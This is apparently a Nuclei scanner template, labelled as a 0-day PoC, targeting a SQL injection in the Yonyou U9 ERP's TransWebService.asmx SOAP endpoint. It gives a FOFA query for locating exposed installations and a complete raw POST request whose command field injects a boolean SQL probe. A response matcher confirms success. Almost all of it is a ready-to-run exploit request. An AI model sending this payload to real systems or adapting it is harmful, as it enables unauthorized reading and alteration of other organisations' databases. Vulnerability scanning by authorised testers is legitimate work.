id: yonyou-u9-transwebservice-sql

info:
  name: "用友 U9 TransWebService.asmx 接口 SQL 注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="logo-u9.png"
        该系统TransWebService.asmx接口存在SQL注入安全缺陷，攻击者可利用该漏洞执行恶意SQL语句实现对数据库的非授权操作，包括数据篡改、删除或新增记录，从而引发数据完整性破坏或服务不可用风险。
  tags: 用友U9

http:
- raw:
  - |
    POST /CS/Office/TransWebService.asmx HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate, br
    Connection: close
    Content-Type: text/xml;charset=UTF-8

    <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
       <soap:Header/>
       <soap:Body>
          <tem:DoQuery>
             <!--type: string-->
             <tem:token>RyTrUyfCJOHQdKToyX82DkLdlj2kujch</tem:token>
             <!--type: string-->
             <tem:command>
    (SELECT CONCAT(CONCAT('NdayTest',(CASE WHEN (7696=7696) THEN '1' ELSE '0' END)),' !'))
    </tem:command>
          </tem:DoQuery>
       </soap:Body>
    </soap:Envelope>
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'NdayTest'
